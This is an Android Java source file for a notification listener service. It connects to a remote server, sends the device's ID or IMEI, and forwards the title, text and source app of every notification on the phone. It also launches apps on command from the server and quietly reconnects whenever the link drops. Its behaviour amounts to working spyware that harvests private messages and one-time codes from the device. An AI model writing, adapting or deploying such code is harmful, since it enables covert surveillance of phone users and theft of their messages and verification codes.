package com.my.ghs;

import android.app.Notification;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.telephony.TelephonyManager;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;
import android.service.controls.*;

public class MyNotificationListener extends NotificationListenerService{

        private Socket socket;
        private OutputStream outputStream;
        private BufferedReader inputReader;
        private final String SERVER_IP = "127.0.0.1"; // replace with your server IP
        private final int SERVER_PORT = 3000;
        private Handler mainHandler;
        private Boolean isActive  = false;

        @Override
        public void onCreate(){
                super.onCreate();
                connectServer();
            }

        public void connectServer(){
                mainHandler = new Handler(Looper.getMainLooper());
                final String deviceId = getDeviceIdentifier();

                if (!isActive){
                        new Thread(new Runnable() {
                                    @Override
                                    public void run(){
                                            try{
                                                    socket = new Socket(SERVER_IP, SERVER_PORT);
                                                    isActive = true;
                                                    outputStream = socket.getOutputStream();
                                                    inputReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));

                                                    // Send device ID as handshake
                                                    outputStream.write((deviceId + "\n").getBytes());
                                                    outputStream.flush();

                                                    // Listen for commands from server
                                                    while (true){
                                                            String line = inputReader.readLine();
                                                            if (line != null){
                                                                    JSONObject obj = new JSONObject(line);
                                                                    final String reply = obj.optString("reply", "");
                                                                    if (!reply.equals("")){
                                                                            mainHandler.post(new Runnable() {
                                                                                        @Override
                                                                                        public void run(){
                                                                                                openAppByPackage(reply);
                                                                                            }
                                                                                    });
                                                                        }
                                                                }
                                                        }

                                                }catch (final Exception e){
                                                    mainHandler.post(new Runnable() {
                                                                @Override
                                                                public void run(){
                                                                        // showToast("❌ Socket Error : " + e.getMessage());
                                                                        connectServer();
                                                                    }
                                                            });
                                                }
                                        }
                                }).start();
                    }
                /*
                else{
                        showToast("Client Already Connected");
                    }
               */
            }


        private String getDeviceIdentifier(){
                try{
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q){
                                return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                            }
                        else{
                                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                                if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED){
                                        return tm.getDeviceId();
                                    }
                            }
                    }catch (Exception e){
                        return "unknown";
                    }
                return "unknown";
            }

        @Override
        public void onNotificationPosted(StatusBarNotification sbn){
                if (sbn == null || sbn.getNotification() == null) return;

                Notification notification = sbn.getNotification();
                CharSequence titleChar = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
                CharSequence textChar = notification.extras.getCharSequence(Notification.EXTRA_TEXT);

                final String title = titleChar != null ? titleChar.toString() : "";
                final String text = textChar != null ? textChar.toString() : "";
                final String pack = sbn.getPackageName();

                sendToServer(title, text, pack);
            }

        private void sendToServer(final String title, final String text, final String pack){
                connectServer();
                new Thread(new Runnable() {
                            @Override
                            public void run(){
                                    try{
                                            if (outputStream != null){
                                                    JSONObject json = new JSONObject();
                                                    json.put("title", title);
                                                    json.put("text", text);
                                                    json.put("package", pack);
                                                    outputStream.write((json.toString() + "\n").getBytes());
                                                    outputStream.flush();
                                                }
                                        }catch (Exception e){
                                            mainHandler.post(new Runnable() {
                                                        @Override
                                                        public void run(){
                                                                showToast("❌ Failed to send data");
                                                                connectServer();
                                                            }
                                                    });
                                        }
                                }
                        }).start();
            }

        private void openAppByPackage(String packageName){
                try{
                        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
                        if (launchIntent != null){
                                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(launchIntent);
                                showToast("Opening "+packageName);
                                
                                sendToServer("success","Opened Successfully", packageName);
                            }
                        else{
                                this.showToast("❌ App not installed : " + packageName);
                                sendToServer("failed","Not Installed", packageName);
                            }
                    }catch (Exception e){
                        this.showToast("⚠️ Error opening: " + packageName);
                    }
            }


        // Create Method For Displaying Toast...

        public void showToast(String msg){
                Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_SHORT).show();
            }





        @Override
        public void onDestroy(){
                super.onDestroy();
                try{
                        if (outputStream != null) outputStream.close();
                        if (socket != null) socket.close();
                        // showToast("Client Disconnected");
                        connectServer();
                    }catch (Exception e){
                        connectServer();
                        // showToast("Client Disconnected : " + e.getMessage());
                    }
            }
    }

